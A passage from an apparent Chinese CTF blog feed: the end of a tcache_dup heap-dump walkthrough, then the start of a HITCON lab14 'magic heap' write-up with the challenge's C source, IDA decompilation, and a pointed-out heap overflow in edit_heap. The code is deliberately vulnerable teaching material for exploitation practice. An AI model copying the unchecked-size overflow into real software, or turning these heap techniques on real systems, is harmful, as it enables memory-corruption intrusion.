class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><code class="hljs c">pwndbg&gt; heap<br>Allocated chunk | PREV_INUSE<br>Addr: <span class="hljs-number">0x601000</span><br>Size: <span class="hljs-number">0x251</span><br><br>Free <span class="hljs-title function_">chunk</span> <span class="hljs-params">(tcache)</span> | PREV_INUSE<br>Addr: 0x601250<br>Size: 0x21<br>fd: 0x601260<br><br>Top chunk | PREV_INUSE<br>Addr: 0x601270<br>Size: 0x20d91<br><br>pwndbg&gt; bin<br>tcachebins<br>0x20 [  0]: 0x601260 ◂— ...<br>fastbins<br>0x20: 0x0<br>0x30: 0x0<br>0x40: 0x0<br>0x50: 0x0<br>0x60: 0x0<br>0x70: 0x0<br>0x80: 0x0<br>unsortedbin<br>all: 0x0<br>smallbins<br>empty<br>largebins<br>empty<br>pwndbg&gt; x/16gx &amp;main_arena<br>0x7ffff7dcfc40 &lt;main_arena&gt;:0x00000000000000000x0000000000000000<br>0x7ffff7dcfc50 &lt;main_arena+16&gt;:0x00000000000000000x0000000000000000<br>0x7ffff7dcfc60 &lt;main_arena+32&gt;:0x00000000000000000x0000000000000000<br>0x7ffff7dcfc70 &lt;main_arena+48&gt;:0x00000000000000000x0000000000000000<br>0x7ffff7dcfc80 &lt;main_arena+64&gt;:0x00000000000000000x0000000000000000<br>0x7ffff7dcfc90 &lt;main_arena+80&gt;:0x00000000000000000x0000000000000000<br>0x7ffff7dcfca0 &lt;main_arena+96&gt;:0x00000000006012700x0000000000000000<br>0x7ffff7dcfcb0 &lt;main_arena+112&gt;:0x00007ffff7dcfca00x00007ffff7dcfca0<br>pwndbg&gt; x/100gx 0x601000<br>0x601000:0x00000000000000000x0000000000000251 #tcache_perthread_struct <br>0x601010:0x00000000000000000x0000000000000000<br>0x601020:0x00000000000000000x0000000000000000<br>0x601030:0x00000000000000000x0000000000000000<br>0x601040:0x00000000000000000x0000000000000000<br>0x601050:0x00000000006012600x0000000000000000<br>    #执行chunk1_data<br>......<span class="hljs-params">(省略内容均为空)</span><br>0x601250:0x00000000000000000x0000000000000021 #chunk1<br>0x601260:0x00000000006012600x0000000000000000<br>0x601270:0x00000000000000000x0000000000020d91 #top_chunk<br>......<span class="hljs-params">(省略内容均为空)</span> <br>0x601310:0x00000000000000000x0000000000000000<br>pwndbg&gt; <br></code></pre></td></tr></tbody></table></figure><p>上面就是tcache_dup的攻击方式，看起来好像没有什么用，下篇文章中的例子会体现。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1&gt;&lt;strong&gt;Tcache Attack中的Tcache dup（基础）&lt;/strong&gt;&lt;/h1&gt;
&lt;blockquote&gt;
&lt;p&gt;参考资料：CTF-wiki：&lt;a href=&quot;https://ctf-wiki.github.io/ctf-wiki/pwn/linux</summary>
      
    
    
    
    <category term="heap" scheme="https://kylinxin.github.io/categories/heap/"/>
    
    
    <category term="Tcache bin Attack" scheme="https://kylinxin.github.io/tags/Tcache-bin-Attack/"/>
    
  </entry>
  
  <entry>
    <title>HITCON Training lab14 magic heap</title>
    <link href="https://kylinxin.github.io/2023/09/15/HITCON%20Training%20lab14%20magic%20heap/"/>
    <id>https://kylinxin.github.io/2023/09/15/HITCON%20Training%20lab14%20magic%20heap/</id>
    <published>2023-09-15T04:58:29.000Z</published>
    <updated>2023-09-13T15:02:03.029Z</updated>
    
    <content type="html"><![CDATA[<h1><strong>unsortedbin_attack（例题）</strong></h1><h2 id="查看保护"><a href="#查看保护" class="headerlink" title="查看保护"></a>查看保护</h2><p class='item-img' data-src='https://s2.loli.net/2023/09/13/AfgB9YjLMT6Sbxv.png'><img src="https://s2.loli.net/2023/09/13/AfgB9YjLMT6Sbxv.png" alt="Snipaste_2023-09-13_21-07-19.png"></p><p>文件没开PIE，got表可写，开启了Canary和NX保护，64位程序。</p><h2 id="程序源代码"><a href="#程序源代码" class="headerlink" title="程序源代码"></a>程序源代码</h2><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">read_input</span><span class="hljs-params">(<span class="hljs-type">char</span> *buf, <span class="hljs-type">size_t</span> size)</span> {<br>  <span class="hljs-type">int</span> ret;<br>  ret = read(<span class="hljs-number">0</span>, buf, size);<br>  <span class="hljs-keyword">if</span> (ret &lt;= <span class="hljs-number">0</span>) {<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">"Error"</span>);<br>    _exit(<span class="hljs-number">-1</span>);<br>  }<br>}<br><br><span class="hljs-type">char</span> *heaparray[<span class="hljs-number">10</span>];<br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> <span class="hljs-type">int</span> magic = <span class="hljs-number">0</span>;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">menu</span><span class="hljs-params">()</span> {<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">"--------------------------------"</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">"       Magic Heap Creator       "</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">"--------------------------------"</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">" 1. Create a Heap               "</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">" 2. Edit a Heap                 "</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">" 3. Delete a Heap               "</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">" 4. Exit                        "</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">"--------------------------------"</span>);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Your choice :"</span>);<br>}<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">create_heap</span><span class="hljs-params">()</span> {<br>  <span class="hljs-type">int</span> i;<br>  <span class="hljs-type">char</span> buf[<span class="hljs-number">8</span>];<br>  <span class="hljs-type">size_t</span> size = <span class="hljs-number">0</span>;<br>  <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">10</span>; i++) {<br>    <span class="hljs-keyword">if</span> (!heaparray[i]) {<br>      <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Size of Heap : "</span>);<br>      read(<span class="hljs-number">0</span>, buf, <span class="hljs-number">8</span>);<br>      size = atoi(buf);<br>      heaparray[i] = (<span class="hljs-type">char</span> *)<span class="hljs-built_in">malloc</span>(size);<br>      <span class="hljs-keyword">if</span> (!heaparray[i]) {<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">"Allocate Error"</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">2</span>);<br>      }<br>      <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Content of heap:"</span>);<br>      read_input(heaparray[i], size);<br>      <span class="hljs-built_in">puts</span>(<span class="hljs-string">"SuccessFul"</span>);<br>      <span class="hljs-keyword">break</span>;<br>    }<br>  }<br>}<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">edit_heap</span><span class="hljs-params">()</span> {<br>  <span class="hljs-type">int</span> idx;<br>  <span class="hljs-type">char</span> buf[<span class="hljs-number">4</span>];<br>  <span class="hljs-type">size_t</span> size;<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Index :"</span>);<br>  read(<span class="hljs-number">0</span>, buf, <span class="hljs-number">4</span>);<br>  idx = atoi(buf);<br>  <span class="hljs-keyword">if</span> (idx &lt; <span class="hljs-number">0</span> || idx &gt;= <span class="hljs-number">10</span>) {<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">"Out of bound!"</span>);<br>    _exit(<span class="hljs-number">0</span>);<br>  }<br>  <span class="hljs-keyword">if</span> (heaparray[idx]) {<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Size of Heap : "</span>);<br>    read(<span class="hljs-number">0</span>, buf, <span class="hljs-number">8</span>);<br>    size = atoi(buf);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Content of heap : "</span>);<br>    read_input(heaparray[idx], size);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">"Done !"</span>);<br>  } <span class="hljs-keyword">else</span> {<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">"No such heap !"</span>);<br>  }<br>}<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">delete_heap</span><span class="hljs-params">()</span> {<br>  <span class="hljs-type">int</span> idx;<br>  <span class="hljs-type">char</span> buf[<span class="hljs-number">4</span>];<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Index :"</span>);<br>  read(<span class="hljs-number">0</span>, buf, <span class="hljs-number">4</span>);<br>  idx = atoi(buf);<br>  <span class="hljs-keyword">if</span> (idx &lt; <span class="hljs-number">0</span> || idx &gt;= <span class="hljs-number">10</span>) {<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">"Out of bound!"</span>);<br>    _exit(<span class="hljs-number">0</span>);<br>  }<br>  <span class="hljs-keyword">if</span> (heaparray[idx]) {<br>    <span class="hljs-built_in">free</span>(heaparray[idx]);<br>    heaparray[idx] = <span class="hljs-literal">NULL</span>;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">"Done !"</span>);<br>  } <span class="hljs-keyword">else</span> {<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">"No such heap !"</span>);<br>  }<br>}<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">l33t</span><span class="hljs-params">()</span> { system(<span class="hljs-string">"cat ./flag"</span>); }<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> {<br>  <span class="hljs-type">char</span> buf[<span class="hljs-number">8</span>];<br>  setvbuf(<span class="hljs-built_in">stdout</span>, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0</span>);<br>  setvbuf(<span class="hljs-built_in">stdin</span>, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0</span>);<br>  <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>) {<br>    menu();<br>    read(<span class="hljs-number">0</span>, buf, <span class="hljs-number">8</span>);<br>    <span class="hljs-keyword">switch</span> (atoi(buf)) {<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">1</span>:<br>      create_heap();<br>      <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">2</span>:<br>      edit_heap();<br>      <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">3</span>:<br>      delete_heap();<br>      <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">4</span>:<br>      <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>      <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">4869</span>:<br>      <span class="hljs-keyword">if</span> (magic &gt; <span class="hljs-number">4869</span>) {<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">"Congrt !"</span>);<br>        l33t();<br>      } <span class="hljs-keyword">else</span><br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">"So sad !"</span>);<br>      <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">default</span>:<br>      <span class="hljs-built_in">puts</span>(<span class="hljs-string">"Invalid Choice"</span>);<br>      <span class="hljs-keyword">break</span>;<br>    }<br>  }<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>}<br><br></code></pre></td></tr></tbody></table></figure><h2 id="IDA静态分析"><a href="#IDA静态分析" class="headerlink" title="IDA静态分析"></a>IDA静态分析</h2><h3 id="main-函数"><a href="#main-函数" class="headerlink" title="main-函数"></a>main 函数</h3><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __cdecl __noreturn <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **argv, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **envp)</span><br>{<br>  <span class="hljs-type">int</span> v3; <span class="hljs-comment">// eax</span><br>  <span class="hljs-type">char</span> buf[<span class="hljs-number">8</span>]; <span class="hljs-comment">// [rsp+0h] [rbp-10h] BYREF</span><br>  <span class="hljs-type">unsigned</span> __int64 v5; <span class="hljs-comment">// [rsp+8h] [rbp-8h]</span><br><br>  v5 = __readfsqword(<span class="hljs-number">0x28</span>u);<br>  setvbuf(<span class="hljs-built_in">stdout</span>, <span class="hljs-number">0LL</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0LL</span>);<br>  setvbuf(<span class="hljs-built_in">stdin</span>, <span class="hljs-number">0LL</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0LL</span>);<br>  <span class="hljs-keyword">while</span> ( <span class="hljs-number">1</span> )<br>  {<br>    <span class="hljs-keyword">while</span> ( <span class="hljs-number">1</span> )<br>    {<br>      menu();<br>      read(<span class="hljs-number">0</span>, buf, <span class="hljs-number">8uLL</span>);<br>      v3 = atoi(buf);<br>      <span class="hljs-keyword">if</span> ( v3 != <span class="hljs-number">3</span> )<br>        <span class="hljs-keyword">break</span>;<br>      delete_heap();<br>    }<br>    <span class="hljs-keyword">if</span> ( v3 &gt; <span class="hljs-number">3</span> )<br>    {<br>      <span class="hljs-keyword">if</span> ( v3 == <span class="hljs-number">4</span> )<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>      <span class="hljs-keyword">if</span> ( v3 == <span class="hljs-number">4869</span> )<br>      {<br>        <span class="hljs-keyword">if</span> ( (<span class="hljs-type">unsigned</span> __int64)magic &lt;= <span class="hljs-number">4869</span> )<br>        {<br>          <span class="hljs-built_in">puts</span>(<span class="hljs-string">"So sad !"</span>);<br>        }<br>        <span class="hljs-keyword">else</span><br>        {<br>          <span class="hljs-built_in">puts</span>(<span class="hljs-string">"Congrt !"</span>);<br>          l33t();<br>        }<br>      }<br>      <span class="hljs-keyword">else</span><br>      {<br>LABEL_17:<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">"Invalid Choice"</span>);<br>      }<br>    }<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> ( v3 == <span class="hljs-number">1</span> )<br>    {<br>      create_heap();<br>    }<br>    <span class="hljs-keyword">else</span><br>    {<br>      <span class="hljs-keyword">if</span> ( v3 != <span class="hljs-number">2</span> )<br>        <span class="hljs-keyword">goto</span> LABEL_17;<br>      edit_heap();<br>    }<br>  }<br>}<br></code></pre></td></tr></tbody></table></figure><p>看一看就行，接下来看具体函数功能</p><h3 id="l33t-存在后门函数"><a href="#l33t-存在后门函数" class="headerlink" title="l33t-存在后门函数"></a>l33t 存在后门函数</h3><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">l33t</span><span class="hljs-params">()</span><br>{<br>  <span class="hljs-keyword">return</span> system(<span class="hljs-string">"cat /home/magicheap/flag"</span>);<br>}<br></code></pre></td></tr></tbody></table></figure><h3 id="全局变量"><a href="#全局变量" class="headerlink" title="全局变量"></a>全局变量</h3><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c">.bss:<span class="hljs-number">00000000006020B</span>9                 align <span class="hljs-number">20</span>h<br>.bss:<span class="hljs-number">00000000006020</span>C0                 public magic<br>.bss:<span class="hljs-number">00000000006020</span>C0 ; __int64 magic<br>.bss:<span class="hljs-number">00000000006020</span>C0 magic           dq ?                    ; DATA XREF: main:loc_400D05↑r<br>.bss:<span class="hljs-number">00000000006020</span>C8                 align <span class="hljs-number">20</span>h<br>.bss:<span class="hljs-number">00000000006020E0</span>                 public heaparray<br>.bss:<span class="hljs-number">00000000006020E0</span> ; heap *heaparray[<span class="hljs-number">10</span>]<br>.bss:<span class="hljs-number">00000000006020E0</span> heaparray       dq ?                    ; DATA XREF: create_heap+<span class="hljs-number">30</span>↑r<br>.bss:<span class="hljs-number">00000000006020E0</span>                                         ; create_heap+<span class="hljs-number">8</span>C↑w ...<br></code></pre></td></tr></tbody></table></figure><p>magic ：00000000006020C0</p><p>heap_ptr ：00000000006020E0</p><h3 id="meau函数"><a href="#meau函数" class="headerlink" title="meau函数"></a>meau函数</h3><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">menu</span><span class="hljs-params">()</span><br>{<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">"--------------------------------"</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">"       Magic Heap Creator       "</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">"--------------------------------"</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">" 1. Create a Heap               "</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">" 2. Edit a Heap                 "</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">" 3. Delete a Heap               "</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">" 4. Exit                        "</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">"--------------------------------"</span>);<br>  <span class="hljs-keyword">return</span> <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Your choice :"</span>);<br>}<br></code></pre></td></tr></tbody></table></figure><p>打印菜单</p><h3 id="create函数"><a href="#create函数" class="headerlink" title="create函数"></a>create函数</h3><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">unsigned</span> __int64 <span class="hljs-title function_">create_heap</span><span class="hljs-params">()</span><br>{<br>  <span class="hljs-type">int</span> i; <span class="hljs-comment">// [rsp+4h] [rbp-1Ch]</span><br>  <span class="hljs-type">size_t</span> size; <span class="hljs-comment">// [rsp+8h] [rbp-18h]</span><br>  <span class="hljs-type">char</span> buf[<span class="hljs-number">8</span>]; <span class="hljs-comment">// [rsp+10h] [rbp-10h] BYREF</span><br>  <span class="hljs-type">unsigned</span> __int64 v4; <span class="hljs-comment">// [rsp+18h] [rbp-8h]</span><br><br>  v4 = __readfsqword(<span class="hljs-number">0x28</span>u);<br>  <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt;= <span class="hljs-number">9</span>; ++i )<br>  {<br>    <span class="hljs-keyword">if</span> ( !heaparray[i] )<br>    {<br>      <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Size of Heap : "</span>);<br>      read(<span class="hljs-number">0</span>, buf, <span class="hljs-number">8uLL</span>);<br>      size = atoi(buf);<br>      heaparray[i] = (heap *)<span class="hljs-built_in">malloc</span>(size);<br>      <span class="hljs-keyword">if</span> ( !heaparray[i] )<br>      {<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">"Allocate Error"</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">2</span>);<br>      }<br>      <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Content of heap:"</span>);<br>      read_input(heaparray[i], size);<br>      <span class="hljs-built_in">puts</span>(<span class="hljs-string">"SuccessFul"</span>);<br>      <span class="hljs-keyword">return</span> __readfsqword(<span class="hljs-number">0x28</span>u) ^ v4;<br>    }<br>  }<br>  <span class="hljs-keyword">return</span> __readfsqword(<span class="hljs-number">0x28</span>u) ^ v4;<br>}<br></code></pre></td></tr></tbody></table></figure><p>输入大小，创建相应大小的堆</p><h3 id="edit函数"><a href="#edit函数" class="headerlink" title="edit函数"></a>edit函数</h3><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">unsigned</span> __int64 <span class="hljs-title function_">edit_heap</span><span class="hljs-params">()</span><br>{<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v1; <span class="hljs-comment">// [rsp+4h] [rbp-1Ch]</span><br>  <span class="hljs-type">size_t</span> v2; <span class="hljs-comment">// [rsp+8h] [rbp-18h]</span><br>  <span class="hljs-type">char</span> buf[<span class="hljs-number">8</span>]; <span class="hljs-comment">// [rsp+10h] [rbp-10h] BYREF</span><br>  <span class="hljs-type">unsigned</span> __int64 v4; <span class="hljs-comment">// [rsp+18h] [rbp-8h]</span><br><br>  v4 = __readfsqword(<span class="hljs-number">0x28</span>u);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Index :"</span>);<br>  read(<span class="hljs-number">0</span>, buf, <span class="hljs-number">4uLL</span>);<br>  v1 = atoi(buf);<br>  <span class="hljs-keyword">if</span> ( v1 &gt;= <span class="hljs-number">0xA</span> )<br>  {<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">"Out of bound!"</span>);<br>    _exit(<span class="hljs-number">0</span>);<br>  }<br>  <span class="hljs-keyword">if</span> ( heaparray[v1] )<br>  {<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Size of Heap : "</span>);<br>    read(<span class="hljs-number">0</span>, buf, <span class="hljs-number">8uLL</span>);<br>    v2 = atoi(buf);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Content of heap : "</span>);<br>    read_input(heaparray[v1], v2);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">"Done !"</span>);<br>  }<br>  <span class="hljs-keyword">else</span><br>  {<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">"No such heap !"</span>);<br>  }<br>  <span class="hljs-keyword">return</span> __readfsqword(<span class="hljs-number">0x28</span>u) ^ v4;<br>}<br></code></pre></td></tr></tbody></table></figure><p>重新输入大小，更新内容，大小由我们定，存在堆溢出哦！！！</p><h3 id="delete函数"><a href="#delete函数" class="headerlink" title="delete函数"></a>delete函数</h3><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">unsigned</span> __int64 <span class="hljs-title function_">delete_heap</span><span class="hljs-params">()</span><br>{<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v1; <span class="hljs-comment">// [rsp+Ch] [rbp-14h]</span><br>  <span class="hljs-type">char</span> buf[<span class="hljs-number">8</span>]; <span class="hljs-comment">// [rsp+10h] [rbp-10h] BYREF</span><br>  <span class="hljs-type">unsigned</span> __int64 